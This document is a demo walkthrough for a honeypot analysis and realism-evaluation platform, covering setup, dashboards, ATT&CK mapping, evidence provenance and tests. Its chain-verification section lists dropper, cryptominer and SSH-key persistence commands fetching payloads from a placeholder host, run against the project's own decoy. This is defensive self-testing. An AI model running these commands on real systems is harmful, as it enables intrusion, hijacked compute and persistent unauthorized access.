# Hivemind — Demo Flow

A scripted walkthrough that exercises every feature once, in an order that builds.
**Every step below was run against the live stack**; the expected values are what it
actually produced, not what it should produce in principle. Where something currently
fails, this document says so rather than leaving you to discover it in front of an
audience — see [§7](#7-what-will-fail-and-why).

Budget **20–25 minutes** for the full flow, or ~8 for the short path
([§8](#8-the-eight-minute-version)).

---

## 0. Before you start

Bring everything up and confirm it, in this order. The health gate matters: a dead
dependency produces failures that look exactly like code defects.

```bash
docker compose up -d
```

Wait for `elasticsearch` and `postgres` to report `healthy`:

```bash
docker compose ps
```

Start Ollama, confirm the model is resident on the GPU:

```bash
ollama ps          # must report 100% GPU — a silent CPU fallback makes analysis ~4x slower
```

Backend — note the environment variable, it is not optional when the backend runs on the
host (see [§7](#7-what-will-fail-and-why)):

```bash
cd backend
EVALUATION_TARGET_HOST=127.0.0.1 .venv/Scripts/python -m uvicorn app.main:app --port 8000
```

Frontend:

```bash
cd frontend
npm run dev        # http://localhost:8080
```

**The one check worth not skipping.** Open **Settings**, or:

```bash
curl -s http://localhost:8000/api/status
```

Expected — this is the real output:

```
elasticsearch    connected      cluster status: green
postgres         connected
ollama           connected      llama3.1:8b
evaluator        disconnected   no API key configured
seed-corpus      running        51 seeded events
```

`evaluator: disconnected` is **correct and expected** unless you have configured a BYOK
key. It is not a broken demo — §5 shows what it produces, and the fact that the system
says "unavailable" rather than inventing a number is itself a thing to demonstrate.

---

## 1. Dashboard — the shape of the data

**Route:** `/` · **Talk to:** what the honeypot has seen.

Shows KPIs, a risk distribution, a classification breakdown, an activity timeline, top
attackers and top commands.

**Point out:** panels that depend on analysis show **zero until an analysis has run**.
They are not placeholders — an unanalysed session genuinely has no classification, and
the dashboard refuses to invent one. You will watch these numbers move in §2.

---

## 2. Honeypots and Log Explorer — raw telemetry

**Routes:** `/honeypots`, `/logs`

`/honeypots` lists the deployed sensor (`cowrie-01`, *Cowrie SSH (med-ws-04)*) with its
health.

`/logs` is the raw event search. Filters map onto ECS field names — `source.ip`,
`event.action`, `process.command_line`, `session.id` — so what you type translates
directly into an Elasticsearch query.

**Optional live traffic.** In a second terminal:

```bash
ssh -p 2222 root@127.0.0.1        # any password is accepted
```

Type `whoami`, `uname -a`, `ls /tmp`, then `exit`. The events appear in the Log Explorer
**within a few seconds**. This is the end-to-end ingest path — Cowrie → Filebeat →
Elasticsearch → API → UI — running live.

---

## 3. Sessions and analysis — the core loop

**Routes:** `/sessions` → `/sessions/seed-botnet-01`

The list shows 25 sessions; 7 carry three or more commands. **Use `seed-botnet-01`** —
it is the reliable demo session, and it is rule-backed, so it produces the same result
every time.

Open it. The timeline classifies each event — connection, authentication, command,
download, execution, disconnect — and a `tunnel` or `protocol` event is never rendered
as an attacker command.

### Run the analysis

Click **Analyze**. Expected, measured:

| | |
|---|---|
| Duration | **~23–28 s** |
| Classification | **Automated botnet dropper** |
| Risk | **critical, 90** |
| Techniques | **3**, all `observed: true`, confidence **1.0** |
| Indicators | **5** |
| Recommended actions | **3** |

**Watch the stepper.** Seven stages advance from real WebSocket frames, not an
animation: parse → identify patterns → classify → extract indicators → map ATT&CK →
correlate intelligence → recommend. Each stage runs in its own model context, because
merging them was measured to produce markedly shallower output.

### The provenance demo — this is the centrepiece

Expand any indicator's evidence. Every claim carries an event id. For example
`seed-botnet-01-011` resolves to the real captured event:

```
id: seed-botnet-01-011 | action: cowrie.command.input
command: sh malicious_script
```

**Say this out loud:** nothing on this screen is asserted without a pointer back to the
log line that produced it, and the pointer is live — it resolves through the same
`/api/events/{id}` endpoint the Log Explorer uses.

### The negative demo — optional, and the most convincing thirty seconds

Analyse `seed-unmapped-01`. Its commands are deliberately chosen so **no rulebook
pattern matches**, so any technique could only come from the model.

On the run recorded while writing this document, the result was:

```
classification : Information Gathering
risk           : medium 60
techniques     : 0
```

**Zero techniques.** The local model inferred nothing, so the system reported nothing.
It did not manufacture a plausible-looking mapping to fill the space. If the model *does*
infer something on your run, it appears labelled **AI INFERENCE** with `observed: false`
and a required explanation — visually distinct from the confidence-1.0 rule-backed
mappings in `seed-botnet-01`. Either outcome makes the point; they just make it
differently.

> This session is genuinely nondeterministic — it is the same behaviour behind the one
> known-nondeterministic test in the suite. Do not promise an audience a specific result.

---

## 4. Intelligence surfaces

**`/mitre`** — the ATT&CK matrix. Against the pinned 21-technique catalog, **5 are
observed** after the analyses above. Observed and inferred are rendered differently, and
that distinction survives the whole path: rulebook → database → Elasticsearch projection
→ this matrix.

**`/threat-intel`** — 23 indicators, extracted by deterministic regex and direct field
reads, with **no model involvement**. Three provenance tiers: an indicator's *value* is
`OBSERVED`; an indicator seen across more than one session becomes `CORRELATED`.

**Attacker profile** — open `185.220.101.44`. Shows sessions, risk, command set, and
behavioural similarity to other attackers by Jaccard index over normalised command sets
— deterministic and explainable rather than embedding-based, so you can say *why* two
attackers were called similar. On this corpus it reports `0.267` against `172.19.0.1`.

**Point out:** if the corpus ever exceeds the cardinality cap, similarity is reported as
**unavailable with a reason** rather than as a confident number computed from truncated
data.

**`/reports`** — generate a report from `seed-botnet-01`. It produces
*"Automated botnet dropper — 185.220.101.44"*. Reports are immutable JSONB snapshots:
re-analysing the session later does **not** rewrite a report already issued.

---

## 5. Realism evaluation — the second half

**Route:** `/evaluation`

This is where the system turns around and attacks its own honeypot.

Pick `cowrie-01`, click **Run evaluation**. Expected, measured:

- The POST returns **HTTP 202 in ~2 s** with just a run id. The run has *not* happened —
  it is dispatched to the background.
- The stepper advances through seven stages from real WebSocket frames.
- The first `GET` for the run returns **404, then 200**. That is the record being
  created, and the UI handles it explicitly rather than treating 404 as an error.

### What comes back

Measured on the live stack, with no BYOK key:

```
status          : completed        evaluator: unavailable      evaluatorModel: None
agentModel      : deterministic-probes@1
modules:
   nmap       completed
   agent      completed
   chains     completed
   tcpdump    completed
category scores:
   attack_possibilities   det=1.0     eval=None
   basic_commands         det=1.0     eval=None
   context                det=1.0     eval=None
   file_system            det=1.0     eval=None
   sanity                 det=0.667   eval=None
   services               det=0.667   eval=None
probeResults: 12   chainSteps: 7   findings: 1
```

### The finding — open this one

The run produces a real, grounded finding:

```
[high] sanity (deterministic):
   hostname_cmd and hostname_file disagree about host.name: 'med-ws-04' vs 'svr04'
   evidence: two probe results
```

**The honeypot contradicts itself.** `hostname` answers `med-ws-04`; `cat /etc/hostname`
answers `svr04`. Both probes establish the same canonical fact, so the contradiction is
detected deterministically — no model involved — and the finding carries **two** evidence
pointers, one per probe, each resolving to the recorded output that disagrees. That is a
genuine realism defect an attacker could use to fingerprint the decoy, found automatically.

### Chain verification

Seven chain steps come back, each matched by a rulebook rule and each citing a real
Cowrie event:

```
dropper         [0] wget http://198.51.100.7/malicious_script.sh   T1105      observed
dropper         [1] chmod 777 malicious_script.sh                  T1222.002  observed
dropper         [2] bash malicious_script.sh                       T1059.004  observed
miner           [0] wget http://198.51.100.7/xmrig                 T1105      observed
miner           [1] chmod 777 xmrig                                T1222.002  observed
miner           [2] ./xmrig                                        T1496      observed
ssh_persistence [0] echo ssh-rsa ... >> /root/.ssh/authorized_keys T1098.004  observed
```

**Click a chain step's event id.** It resolves to the real captured event — the same
`/api/events/{id}` path the Log Explorer uses. This is the provenance demo from §3, but
for the evaluation half: the honeypot was attacked, the attack was recognised by the same
rulebook that classifies real intrusions, and the claim points at the log line proving it.

**Four things to demonstrate here, and they are the whole point of the half:**

1. **`sanity` and `services` show real fractions** — `0.667` each, two of three. Those
   *are* verdicts. `sanity` scoring 0.667 is the honeypot's own defect, not ours: two of
   three sanity probes agreed, one pair contradicted (see the finding below).
2. **Every characteristic scores here, but a null is still a different thing.** If a
   module cannot run, its facts are `unknown` and excluded from *both* the numerator and
   the denominator — never scored as zero. To show that live, clear
   `EVALUATION_CAPTURE_IMAGE` and re-run: `context` returns to "not established", in
   words, because the capture could not look.
3. **Our own failure is never counted against the honeypot.** That rule is why
   `not_observed` and `unknown` are different values rather than both being "no".

Also worth naming: **`agentModel` is `deterministic-probes@1`, not a model name.** The
probe agent is Paramiko plus a fixed probe list — no model drives it — so naming one
would invite a reader to attribute a run-to-run difference to a model change that never
happened.

### The evaluator

`evaluator: unavailable` with **every** `evaluatorRating` null. Without a BYOK key the
run completes and reports the gap. It **never falls back to the local model**, because
the source paper measured sub-70b models as returning only superficial critique in this
role — and a shallow-but-plausible realism verdict is precisely the failure this system
exists to prevent.

To demonstrate the configured path, set `BYOK_PROVIDER` / `BYOK_API_KEY` / `BYOK_MODEL`
in `backend/.env` (see `backend/.env.example`) and restart the backend.

### Compare two runs

Run a **second** evaluation, then open **Compare** and select both.

With nothing changed between them you get `same_configuration` and both "did not change"
notices. The interesting demonstration is the asymmetry — say it even if you cannot
trigger it live:

- a changed **honeypot** fingerprint is reported as a *positive*: that change is the
  improvement being measured, and the deltas are its effect;
- a changed **evaluation configuration** fingerprint is a *warning*: our own probes,
  chains, rulebook or budget moved, so the delta is not attributable to the honeypot.

The comparison is never refused — it states plainly whether a delta can be attributed.

Deltas are shown in **percentage points** (`+11 pp`), deliberately a different unit from
the scores themselves, so a delta can never be misread as a score.

---

## 6. Demo mode — no backend at all

Useful as a fallback if the stack misbehaves in front of an audience, and it exercises
the null paths deterministically.

```bash
cd frontend
mv .env .env.bak        # or just unset VITE_API_BASE_URL
npm run dev
```

Every surface renders from a labelled demo dataset. Three fixtures exist specifically to
exercise states that are hard to trigger live:

| Fixture | Demonstrates |
|---|---|
| `evaluationRunB` | evaluator `unavailable`, every rating null — nothing renders as `0.0` |
| `evaluationRunC` | `status: failed` while **every module is `completed`** — *our* orchestration failed, not the honeypot |
| `evaluationRunA` | a null `deterministicScore` **and** an entirely absent characteristic — "not established" and "not measured" are different things |

Restore with `mv .env.bak .env`.

---

## 7. What will fail, and why

Be upfront about these rather than being surprised.

### `EVALUATION_TARGET_HOST` defaults to `cowrie`

That is the compose service name and does **not** resolve from a backend running on the
host — you get `getaddrinfo failed` and even nmap reports nothing. Start the backend with
`EVALUATION_TARGET_HOST=127.0.0.1` as §0 shows.

This one is worth knowing for a second reason. The honeypot is reached through a
*published container port*, so Docker re-originates the connection and Cowrie records the
proxy's source port, not ours — we open from one port and Cowrie logs another. Chain
verification therefore scopes its read-back on Cowrie's own `session.id`, discovered via a
per-session nonce the agent writes, rather than on the port. If you see chains time out
with "commands were not indexed", that correlation is where to look.

### The packet capture needs its image pulled

The capture runs inside the honeypot container's network namespace, from
`nicolaka/netshoot`. Pull it once before the demo or the first run spends a minute
fetching it:

```bash
docker pull nicolaka/netshoot
```

Capturing anywhere else does not work for a containerised honeypot, and the failure is
silent rather than loud: measured here, a WSL distro counted **0 packets** for the same
SSH session the container's own namespace counted **30**. Zero would be reported as
`not_observed` — "no traffic occurred" — which is a false claim rather than an absent one.

### `nmap` is optional too

Without it the service-scan probe reports `unknown` for every expected service, rather
than `not_observed`. Our inability to look is not evidence against the honeypot.

### One test is genuinely nondeterministic

`test_intel.py::test_coverage_marks_llm_inferred_technique_as_not_observed` passes or
fails depending on whether `llama3.1:8b` happens to infer a technique on that pass. A
suite run showing **exactly this one failure** is a clean run.

---

## 8. The eight-minute version

If you are short on time, this is the spine:

1. `/api/status` — everything connected, evaluator honestly reported as unavailable.
2. `/sessions/seed-botnet-01` → **Analyze** → watch the seven-stage stepper (~25 s).
3. Expand an indicator's evidence → the real log line. **This is the project's thesis.**
4. `/mitre` — observed vs inferred, rendered differently.
5. `/evaluation` → **Run evaluation** → 202 in ~2 s, then the two assessments side by
   side, with `context` as "not established" beside a real `0.667`.
6. Open the sanity finding — the honeypot disagrees with itself about its own hostname —
   and a chain step's event id, which resolves to the real captured command.

---

## 9. Test everything once

```bash
cd backend && .venv/Scripts/python -m pytest
```

**455 tests**, run against the live Docker stack and the real local model — bring the
infrastructure up first. Expect **454 passed, 1 failed**: the nondeterministic intel test
above. Any other failure is real.

Runtime is roughly **6–8 minutes**.

```bash
cd frontend
npx tsc --noEmit      # exit 0
npm run lint          # 9 problems, 0 errors, 9 warnings — this is the baseline
npm run build         # succeeds
```

---

## 10. Reset between demos

Evaluation runs accumulate. To clear them:

```bash
cd backend && .venv/Scripts/python -c "
import asyncio
from sqlalchemy import text
from app.db.session import get_session_factory
from app.services.evaluation import runs
async def m():
    async with get_session_factory()() as db:
        ids = [r[0] for r in (await db.execute(text('SELECT id FROM evaluation_runs'))).all()]
    for i in ids:
        await runs.delete_run(i)
    print('cleared', len(ids), 'runs')
asyncio.run(m())
"
```

`delete_run` removes a run's children in foreign-key order — no FK in the evaluation
schema declares `ondelete`, so deleting the run row first would fail.

The honeypot itself is **not** reset by this. An evaluation run clears only the state a
previous run created (`downloads/`, `tty/`), and the reset boundary is enforced in code:
the honeypot's SSH host keys, its `uuid`, its config and its logs are preserved, and a
path-traversal attempt is rejected outright.

To start completely fresh:

```bash
docker compose down -v && docker compose up -d
```

That discards the Elasticsearch and Postgres volumes; the backend re-installs its ingest
pipeline and re-seeds the corpus on next start.
